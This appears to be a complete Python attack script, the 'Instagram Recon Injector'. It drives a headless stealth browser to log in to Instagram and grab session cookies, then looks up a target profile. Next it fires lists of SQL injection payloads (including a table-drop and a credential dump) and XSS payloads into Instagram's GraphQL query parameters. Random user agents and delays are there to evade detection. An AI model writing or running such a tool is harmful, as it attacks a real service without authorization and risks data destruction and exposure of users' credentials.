import time, json, random
import requests
from urllib.parse import quote
import undetected_chromedriver.v2 as uc
from selenium.webdriver.common.by import By

# -------------------- CONFIG --------------------
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT null, username || ':' || password FROM users--",
    "' AND (SELECT 1 FROM users WHERE username='admin')=1--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' AND SLEEP(5)--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(`XSS`)'>",
    "<body onload=prompt('x')>"
]

# -------------------- LOGIN & TOKEN EXTRACTION --------------------
def login_and_extract_cookies(username, password):
    print("[*] Launching stealth browser...")
    options = uc.ChromeOptions()
    options.headless = True
    driver = uc.Chrome(options=options)
    
    driver.get("https://www.instagram.com/accounts/login/")
    time.sleep(5)

    print("[*] Logging in...")
    driver.find_element(By.NAME, "username").send_keys(username)
    driver.find_element(By.NAME, "password").send_keys(password)
    driver.find_element(By.XPATH, "//button[@type='submit']").click()
    time.sleep(8)

    cookies = {c['name']: c['value'] for c in driver.get_cookies()}
    driver.quit()
    return cookies

# -------------------- ATTACK FUNCTION --------------------
def graphql_attack(target_username, cookies, mode='XSS'):
    print(f"[*] Pulling target data for: {target_username}")
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)"
        ]),
        "x-ig-app-id": "936619743392459",  # Default IG web ID
    }

    session = requests.Session()
    session.headers.update(headers)
    session.cookies.update(cookies)

    user_url = f"https://www.instagram.com/{target_username}/?__a=1&__d=dis"
    r = session.get(user_url)

    if r.status_code != 200:
        print("[-] Failed to access user page, maybe banned or private?")
        return

    try:
        json_data = r.json()
        user_id = json_data["graphql"]["user"]["id"]
    except:
        print("[-] Couldn’t parse user ID.")
        return

    print(f"[+] Target user ID: {user_id}")

    query_url = "https://www.instagram.com/graphql/query/"
    variables = {
        "id": user_id,
        "first": 12
    }

    payloads = XSS_PAYLOADS if mode == "XSS" else SQLI_PAYLOADS

    for payload in payloads:
        variables["after"] = payload
        params = {
            "query_hash": "58b6785bea111c67129decbe6a448951",  # One of IG’s post-fetch queries
            "variables": json.dumps(variables)
        }
        res = session.get(query_url, params=params)

        if res.status_code == 200 and payload in res.text:
            print(f"[!!!] {mode} success with payload: {payload}")
        else:
            print(f"[~] Tried: {payload}")

        time.sleep(random.uniform(3, 7))  # Slow and sneaky

# -------------------- MAIN --------------------
if __name__ == "__main__":
    print("*** Instagram Recon Injector ***")
    uname = input("IG Username: ")
    pword = input("IG Password: ")
    target = input("Target Profile Username: ")

    creds = login_and_extract_cookies(uname, pword)
    graphql_attack(target, creds, mode="XSS")
